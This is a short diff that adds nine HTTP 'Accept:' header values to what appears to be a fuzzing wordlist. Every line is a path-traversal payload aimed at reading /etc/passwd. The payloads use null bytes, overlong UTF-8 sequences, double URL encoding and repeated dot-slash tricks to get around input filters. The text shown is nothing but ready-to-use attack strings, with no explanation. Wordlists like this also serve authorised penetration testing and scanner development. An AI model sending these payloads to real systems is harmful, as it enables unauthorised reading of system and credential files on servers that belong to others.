@@ -1,0 +1,9 @@
+Accept: etc/passwd
+Accept: etc/passwd%00
+Accept: ../../etc/passwd
+Accept: ....//....//etc/passwd{{
+Accept: %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+Accept: ..///////..////..//////etc/passwd
+Accept: /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+Accept: %252e%252e%252fetc%252fpasswd%00
+Accept: ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
